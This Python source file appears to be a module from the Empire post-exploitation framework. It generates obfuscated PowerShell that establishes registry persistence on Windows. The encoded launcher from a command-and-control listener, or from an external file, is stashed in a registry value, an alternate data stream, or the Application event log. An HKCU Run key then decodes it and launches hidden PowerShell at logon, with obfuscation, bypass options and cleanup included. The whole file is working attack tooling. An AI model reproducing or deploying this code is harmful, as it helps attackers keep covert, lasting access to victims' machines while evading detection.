from __future__ import print_function

import os
from builtins import object
from builtins import str
from typing import Dict

from empire.server.common import helpers
from empire.server.common.module_models import PydanticModule
from empire.server.utils import data_util
from empire.server.utils.module_util import handle_error_message


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):
        # Set booleans to false by default
        obfuscate = False

        listener_name = params['Listener']
        
        # trigger options
        key_name = params['KeyName']
        
        # storage options
        reg_path = params['RegPath']
        ads_path = params['ADSPath']
        event_log_id = params['EventLogID']
        
        # management options
        ext_file = params['ExtFile']
        cleanup = params['Cleanup']
        
        # staging options
        user_agent = params['UserAgent']
        proxy = params['Proxy']
        proxy_creds = params['ProxyCreds']
        if (params['Obfuscate']).lower() == 'true':
            obfuscate = True
        obfuscate_command = params['ObfuscateCommand']

        status_msg = ""
        location_string = ""
        
        # for cleanup, remove any script from the specified storage location
        #   and remove the specified trigger
        if cleanup.lower() == 'true':
            if ads_path != '':
                if ".txt" not in ads_path:
                    return handle_error_message("[!] For ADS, use the form C:\\users\\john\\AppData:blah.txt")

                script = "Invoke-Command -ScriptBlock {cmd /C \"echo x > " + ads_path + "\"};"
            else:
                # remove the script stored in the registry at the specified reg path
                path = "\\".join(reg_path.split("\\")[0:-1])
                name = reg_path.split("\\")[-1]
                
                script = "$RegPath = '" + reg_path + "';"
                script += "$parts = $RegPath.split('\\');"
                script += "$path = $RegPath.split(\"\\\")[0..($parts.count -2)] -join '\\';"
                script += "$name = $parts[-1];"
                script += "$null=Remove-ItemProperty -Force -Path $path -Name $name;"
            
            script += "Remove-ItemProperty -Force -Path HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ -Name " + key_name + ";"
            script += "'Registry Persistence removed.'"
            script = data_util.keyword_obfuscation(script)

        if obfuscate:
            script = helpers.obfuscate(main_menu.installPath, psScript=script, obfuscationCommand=obfuscation_command)
            return script
        
        if ext_file != '':
            # read in an external file as the payload and build a
            #   base64 encoded version as encScript
            if os.path.exists(ext_file):
                f = open(ext_file, 'r')
                file_data = f.read()
                f.close()
                
                # unicode-base64 encode the script for -enc launching
                enc_script = helpers.enc_powershell(file_data)
                status_msg += "using external file " + ext_file
            
            else:
                return handle_error_message("[!] File does not exist: " + ext_file)

        else:
            # if an external file isn't specified, use a listener
            if not main_menu.listeners.is_listener_valid(listener_name):
                # not a valid listener, return nothing for the script
                return handle_error_message("[!] Invalid listener: " + listener_name)

            else:
                # generate the PowerShell one-liner with all of the proper options set
                launcher = main_menu.stagers.generate_launcher(listener_name, language='powershell', encode=True,
                                                               obfuscate=obfuscate, obfuscationCommand=obfuscate_command,
                                                               userAgent=user_agent, proxy=proxy, proxyCreds=proxy_creds,
                                                               bypasses=params['Bypasses'])
                
                enc_script = launcher.split(" ")[-1]
                status_msg += "using listener " + listener_name
        
        if ads_path != '':
            # store the script in the specified alternate data stream location
            
            if ads_path != '':
                if ".txt" not in ads_path:
                    return handle_error_message("[!] For ADS, use the form C:\\users\\john\\AppData:blah.txt")

                script = "Invoke-Command -ScriptBlock {cmd /C \"echo " + enc_script + " > " + ads_path + "\"};"
                
                location_string = "$(cmd /c \''more < " + ads_path + "\'')"
        
        elif event_log_id != '':
            # store the script in the event log under the specified ID
            # credit to @subtee
            #   https://gist.github.com/subTee/949fdf0f141546f24978
            
            # sanity check to make sure we haven't exceeded the 31389 byte max
            if len(enc_script) > 31389:
                return handle_error_message("[!] Warning: encoded script exceeds 31389 byte max.")

            status_msg += " stored in Application event log under EventID " + event_log_id + "."
            
            # command to write out the encoded script to the specified eventlog ID
            script = "Write-EventLog -logname Application -source WSH -eventID " + event_log_id + " -entrytype Information -message 'Debug' -category 1 -rawdata \"" + enc_script + "\".ToCharArray();"
            
            # command to decode the binary data from the event log location
            location_string = "$([Text.Encoding]::ASCII.GetString(@((Get-Eventlog -LogName Application | ?{$_.eventid -eq " + event_log_id + "}))[0].data))"
        
        else:
            # otherwise store the script into the specified registry location
            path = "\\".join(reg_path.split("\\")[0:-1])
            name = reg_path.split("\\")[-1]
            
            status_msg += " stored in " + reg_path + "."
            
            script = "$RegPath = '" + reg_path + "';"
            script += "$parts = $RegPath.split('\\');"
            script += "$path = $RegPath.split(\"\\\")[0..($parts.count -2)] -join '\\';"
            script += "$name = $parts[-1];"
            script += "$null=Set-ItemProperty -Force -Path $path -Name $name -Value " + enc_script + ";"
            
            # note where the script is stored
            location_string = "$((gp " + path + " " + name + ")." + name + ")"
        
        # set the run key to extract the encoded script from the specified location
        #   and start powershell.exe in the background with the encoded command
        script += "$null=Set-ItemProperty -Force -Path HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ -Name " + key_name + " -Value '\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -c \"$x=" + location_string + ";powershell -Win Hidden -enc $x\"';"
        
        script += "'Registry persistence established " + status_msg + "'"
        script = data_util.keyword_obfuscation(script)
        if obfuscate:
            script = helpers.obfuscate(main_menu.installPath, psScript=script,
                                       obfuscationCommand=obfuscation_command)
        script = data_util.keyword_obfuscation(script)

        return script
